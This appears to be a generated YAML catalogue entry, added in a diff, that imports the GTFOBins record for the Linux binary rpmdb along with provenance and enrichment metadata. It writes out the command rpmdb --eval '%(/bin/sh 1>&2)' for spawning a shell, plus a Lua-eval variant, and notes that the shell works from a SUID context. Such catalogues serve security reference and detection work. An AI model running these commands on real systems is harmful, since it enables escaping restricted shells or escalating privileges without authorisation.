@@ -1,0 +1,79 @@
+id: gtfobins/rpmdb/shell/unprivileged
+type: binary
+platform: linux
+name: rpmdb
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: rpmdb --eval '%(/bin/sh 1>&2)'
+references:
+- https://gtfobins.github.io/gtfobins/rpmdb/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        rpmdb:
+          functions:
+            inherit:
+            - code: rpmdb --eval '%{lua:...}'
+              comment: This allows to run Lua code (`...`).
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: lua
+              version: Some older version is required.
+            shell:
+            - code: rpmdb --eval '%(/bin/sh 1>&2)'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/rpmdb/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:a35e379d87e3632caf298ae889c2917295c92103572beb456f6414aa72de4597
